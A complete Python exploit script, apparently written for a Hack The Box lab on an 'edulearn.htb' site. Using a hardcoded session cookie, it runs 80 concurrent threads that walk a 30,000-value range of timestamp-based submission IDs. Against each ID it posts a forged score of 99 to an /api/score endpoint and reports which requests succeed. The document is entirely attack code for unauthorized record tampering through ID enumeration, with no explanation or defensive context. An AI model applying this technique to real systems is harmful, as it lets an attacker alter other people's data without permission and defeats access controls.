#!/usr/bin/env python3
import concurrent.futures
import collections
import threading
import requests

TARGET = "http://154.57.164.72:32179"
COOKIE = "s%3Ayve069_dIxGm6AJw12-V_R9cK-0sXTQz.MG6aKxiBrhNQzdSB0RXEeALOSmUfr3rflQZx3vDqxcA"
START = 1786604528483
STOP = 1786604558483
COUNTS = collections.Counter()
LOCAL = threading.local()


def probe(submission_id):
    if not hasattr(LOCAL, "session"):
        LOCAL.session = requests.Session()
    response = LOCAL.session.post(
        f"{TARGET}/api/score/{submission_id}",
        headers={"Host": "edulearn.htb:32179", "Cookie": f"connect.sid={COOKIE}"},
        json={"score": 99},
        timeout=5,
    )
    COUNTS[response.status_code] += 1
    return submission_id if response.status_code == 200 else None


with concurrent.futures.ThreadPoolExecutor(max_workers=80) as pool:
    for found in pool.map(probe, range(START, STOP)):
        if found:
            print(found, flush=True)
print(COUNTS)
